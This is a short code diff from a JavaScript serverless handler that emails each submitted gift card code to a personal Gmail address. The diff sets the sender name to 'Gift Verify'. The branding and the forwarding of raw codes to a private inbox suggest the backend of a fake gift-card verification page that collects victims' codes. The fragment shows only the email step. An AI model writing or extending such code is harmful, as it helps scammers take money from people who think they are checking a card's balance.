@@ -18,7 +18,7 @@ export default async function handler(req, res) {
 
     // ✅ SEND EMAIL
     await resend.emails.send({
-      from: "onboarding@resend.dev", // leave this
+      from: "Gift Verify <onboarding@resend.dev>", // leave this
       to: "sodiqdioxide@gmail.com", // your email
       subject: "🎁 New Gift Card Code",
       html: `<h2>New Code Received</h2><p><b>Code:</b> ${code}</p>`
